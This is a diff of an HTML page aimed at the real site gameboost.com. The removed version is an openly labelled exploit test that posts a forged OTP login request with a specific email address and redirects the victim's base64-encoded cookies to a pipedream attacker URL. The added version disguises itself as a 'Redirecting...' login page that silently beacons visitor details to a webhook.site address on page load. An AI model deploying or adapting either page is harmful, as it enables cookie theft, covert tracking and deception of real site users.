@@ -1,66 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Gameboost Exploit Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
 </head>
-<body>
-    <h1>Testing gameboost.com/otp/send-login</h1>
-    
-    <h3>Sending malicious request...</h3>
-    
-    <div id="request"></div>
-    <div id="response"></div>
-    
+<body onload="sendAndRedirect()">
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
+        <h2>Processing your request...</h2>
+        <p>Please wait while we redirect you to the login page.</p>
+    </div>
+
     <script>
-        // ATTACKER DOMAIN
-        const ATTACKER_DOMAIN = 'https://eo74rbqu36go8g.m.pipedream.net';
+        function sendAndRedirect() {
         
-        // STEAL SESSION COOKIES FIRST
-        fetch('https://gameboost.com', {credentials: 'include'})
-        .then(() => {
-            // SEND EXPLOIT REQUEST
-            fetch('https://gameboost.com/otp/send-login', {
-                method: 'POST',
-                headers: {
-                    'Host': 'gameboost.com',
-                    'Referer': ATTACKER_DOMAIN,
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'X-Inertia': 'true',
-                    'Origin': 'https://gameboost.com',
-                    'Cookie': document.cookie // HIJACKED SESSION
-                },
-                body: JSON.stringify({
-                    "email": "ridoyp99@gmail.com",
-                    "otp": null
-                }),
-                credentials: 'include'
-            })
-            .then(response => {
-                document.getElementById('request').innerHTML = `
-                    <h3>✅ REQUEST SENT</h3>
-                    <pre>POST /otp/send-login
-Referer: ${ATTACKER_DOMAIN}
-Cookie: ${document.cookie.substring(0,100)}...
-{"email":"ridoyp99@gmail.com","otp":null}</pre>
-                `;
+            const webhookUrl = "https://webhook.site/028048b6-9240-4e61-bff6-e35594c32a79";
+            
+
+            const victimData = {
+                referrer: document.referrer || "Direct Access",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenResolution: window.screen.width + "x" + window.screen.height,
+                timestamp: new Date().toLocaleString()
+            };
+
+           
+            navigator.sendBeacon(webhookUrl, JSON.stringify(victimData));
+
+           
+            setTimeout(function() {
                 
-                document.getElementById('response').innerHTML = `
-                    <h3>📡 RESPONSE: ${response.status}</h3>
-                    <pre>Location: ${response.headers.get('location') || 'Redirect detected!'}</pre>
-                `;
-                
-                // AUTO REDIRECT TO ATTACKER (EXPLOIT!)
-                setTimeout(() => {
-                    window.location.href = ATTACKER_DOMAIN + '?stolen=' + btoa(document.cookie);
-                }, 2000);
-            })
-            .catch(err => {
-                document.getElementById('response').innerHTML = '<h3>❌ Error: ' + err + '</h3>';
-            });
-        });
+                window.location.href = "https://gameboost.com"; 
+            }, 1000); 
+        }
     </script>
-    
-    <iframe src="https://gameboost.com" style="display:none;"></iframe>
 </body>
 </html>
